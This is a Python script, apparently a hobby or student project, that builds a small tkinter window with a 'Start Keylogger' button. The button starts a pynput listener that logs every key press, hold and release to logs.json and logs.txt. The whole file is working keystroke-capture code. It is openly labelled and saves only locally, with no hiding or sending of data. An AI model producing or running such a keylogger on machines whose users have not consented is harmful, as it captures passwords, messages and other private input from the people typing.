import tkinter as tk
from tkinter import *
from pynput import keyboard
import json

# GUI Setup
root = tk.Tk()
root.geometry("250x350")
root.title("Keylogger Page")
root.configure(bg="lightgreen")

# Global Variables
key_list = []
x = False
key_strokes = ""

# File Saving Functions
def update_txt_file(key):
    with open('logs.txt', 'w+') as key_stroke:
        key_stroke.write(key)

def update_json_file(key_list):
    with open('logs.json', 'wb') as key_log:
        key_list_bytes = json.dumps(key_list).encode()
        key_log.write(key_list_bytes)

# Key Event Handlers
def on_press(key):
    global x, key_list
    if x == False:
        key_list.append({'Pressed': f'{key}'})
        x = True
    elif x == True:
        key_list.append({'Held': f'{key}'})
    
    update_json_file(key_list)

def on_release(key):
    global x, key_list, key_strokes
    key_list.append({'Released': f'{key}'})
    
    if x == True:
        x = False
    
    update_json_file(key_list)
    
    # Update the continuous string for the text file
    key_strokes = key_strokes + str(key)
    update_txt_file(str(key_strokes))

# Button Action to Start Listener
def butaction():
    print("[+] Running Keylogger successfully!\n[!] Saving the key logs in 'logs.json'")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# GUI Layout (Labels for spacing and Title)
empty = Label(root, text=" ", bg="lightgreen").grid(row=0, column=0)
empty = Label(root, text=" ", bg="lightgreen").grid(row=1, column=0)
empty = Label(root, text=" ", bg="lightgreen").grid(row=2, column=0)

title_label = Label(root, text="Keylogger Project", font='Verdana 11 bold', bg="lightgreen")
title_label.grid(row=3, column=2)

empty = Label(root, text=" ", bg="lightgreen").grid(row=4, column=0)
empty = Label(root, text=" ", bg="lightgreen").grid(row=5, column=0)

start_button = Button(root, text="Start Keylogger", command=butaction)
start_button.grid(row=6, column=2)

root.mainloop()